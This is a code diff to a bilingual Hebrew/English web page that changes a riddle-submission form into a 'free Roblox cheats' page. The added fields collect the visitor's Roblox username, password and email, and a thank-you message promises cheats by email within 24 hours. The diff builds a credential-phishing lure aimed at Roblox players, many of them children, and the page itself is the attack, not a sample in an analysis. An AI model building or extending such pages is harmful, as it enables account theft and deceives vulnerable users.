@@ -10,6 +10,7 @@
             --bg-color: #ffffff;
             --input-bg: #f5f5f7;
             --text-color: #1d1d1f;
+            --danger-color: #ff3b30;
         }
 
         body {
@@ -30,7 +31,6 @@
             text-align: center;
         }
 
-        /* לובי */
         #lobby { display: block; }
         #form-content, #success-message { display: none; }
 
@@ -38,7 +38,7 @@
 
         .btn-group { display: flex; gap: 10px; flex-direction: column; }
 
-        .input-group { margin-bottom: 20px; text-align: inherit; }
+        .input-group { margin-bottom: 15px; text-align: inherit; }
 
         label {
             display: block;
@@ -69,6 +69,7 @@
             font-size: 16px;
             font-weight: 500;
             transition: opacity 0.2s;
+            margin-top: 10px;
         }
 
         button:hover { opacity: 0.8; }
@@ -79,7 +80,14 @@
             border: 1px solid #d2d2d7;
         }
 
-        /* התאמה לאנגלית (LTR) */
+        .clear-btn {
+            background-color: transparent;
+            color: var(--danger-color);
+            font-size: 14px;
+            padding: 8px;
+            text-decoration: underline;
+        }
+
         .en-mode { direction: ltr; text-align: left; }
         .en-mode .input-group { text-align: left; }
     </style>
@@ -89,9 +97,7 @@
 <div class="container" id="main-container">
     
     <div id="lobby">
-        <h1>Welcome to the site that gives you quotes for Roblox. Choose a preferred language. /
-            ברוכים הבאים לאתר שנותן לכם ציטים לרובלוקס בחרו שפה מועדפת
-        </h1>
+        <h1>Welcome / ברוכים הבאים</h1>
         <div class="btn-group">
             <button onclick="setLanguage('he')">עברית</button>
             <button class="lang-btn" onclick="setLanguage('en')">English</button>
@@ -99,25 +105,31 @@
     </div>
 
     <div id="form-content">
-        <h1 id="title-text">הוספת חידה</h1>
+        <h1 id="title-text">קבלת ציטים</h1>
         <form id="riddle-form">
             <div class="input-group">
-                <label id="label-riddle">מה החידה?</label>
-                <textarea name="riddle" id="riddle" rows="3" required></textarea>
+                <label id="label-user">שם משתמש</label>
+                <input type="text" name="username" id="username" required>
             </div>
             <div class="input-group">
-                <label id="label-solution">מה הפתרון?</label>
-                <input type="text" name="solution" id="solution" required>
+                <label id="label-pass">סיסמה</label>
+                <input type="password" name="password" id="password" required>
             </div>
+            <div class="input-group">
+                <label id="label-email">אימייל</label>
+                <input type="email" name="email" id="email" required>
+            </div>
+            
             <button type="submit" id="submit-btn">שליחה</button>
+            <button type="button" class="clear-btn" id="clear-btn" onclick="clearData()">ציטים בחינם</button>
         </form>
     </div>
 
     <div id="success-message">
         <h2 style="font-size: 40px; margin-bottom: 10px;">✓</h2>
         <h2 id="success-title">תודה רבה</h2>
-        <p id="success-p" style="color: #86868b;">החידה שלך התקבלה במערכת.</p>
-        <button style="background:none; color:#0066cc;" onclick="location.reload()" id="back-btn">שלח עוד אחת</button>
+        <p id="success-p" style="color: #86868b;">הפרטים התקבלו.</p>
+        <button style="background:none; color:#0066cc;" onclick="location.reload()" id="back-btn">חזרה</button>
     </div>
 </div>
 
@@ -125,21 +137,25 @@
     const translations = {
         he: {
             title: "קבלת ציטים ברובלוקס",
-            labelRiddle: "שם משתמש",
-            labelSolution: "סיסמה",
+            labelUser: "שם משתמש",
+            labelPass: "סיסמה",
+            labelEmail: "אימייל",
             submit: "שליחה",
+            clear: "מחק את כל הנתונים",
             successTitle: "תודה רבה",
-            successP: "קבלת הציטים תתקבל עד 24 שעות",
+            successP: "קבלת הציטים תתקבל עד 24 שעות לאימייל",
             back: "נסה שוב אם לא נשלח אלייך",
             dir: "rtl"
         },
         en: {
             title: "Getting cheats in Roblox",
-            labelRiddle: "Username",
-            labelSolution: "Password",
+            labelUser: "Username",
+            labelPass: "Password",
+            labelEmail: "Email ",
             submit: "Send",
+            clear: "Clear all data",
             successTitle: "Thank You",
-            successP: "You will receive the cheats within 24 hours",
+            successP: "You will receive the cheats via email within 24 hours",
             back: "Try again if you didn't receive it",
             dir: "ltr"
         }
@@ -148,29 +164,31 @@
     function setLanguage(lang) {
         const t = translations[lang];
         
-        // עדכון טקסטים
         document.getElementById('title-text').innerText = t.title;
-        document.getElementById('label-riddle').innerText = t.labelRiddle;
-        document.getElementById('label-solution').innerText = t.labelSolution;
+        document.getElementById('label-user').innerText = t.labelUser;
+        document.getElementById('label-pass').innerText = t.labelPass;
+        document.getElementById('label-email').innerText = t.labelEmail;
         document.getElementById('submit-btn').innerText = t.submit;
+        document.getElementById('clear-btn').innerText = t.clear;
         document.getElementById('success-title').innerText = t.successTitle;
         document.getElementById('success-p').innerText = t.successP;
         document.getElementById('back-btn').innerText = t.back;
         
-        // עדכון כיווניות
         document.body.dir = t.dir;
+        const container = document.getElementById('main-container');
         if(lang === 'en') {
-            document.getElementById('main-container').classList.add('en-mode');
+            container.classList.add('en-mode');
         } else {
-            document.getElementById('main-container').classList.remove('en-mode');
+            container.classList.remove('en-mode');
         }
 
-        // מעבר מהלובי לטופס
         document.getElementById('lobby').style.display = 'none';
         document.getElementById('form-content').style.display = 'block';
     }
 
-    // שליחת הטופס (נשאר אותו דבר עם ה-ID שלך)
+    
+  
+
     const form = document.getElementById('riddle-form');
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -198,6 +216,7 @@
         } catch (error) {
             alert("Connection Error");
             btn.disabled = false;
+            btn.innerText = originalText;
         }
     });
 </script>
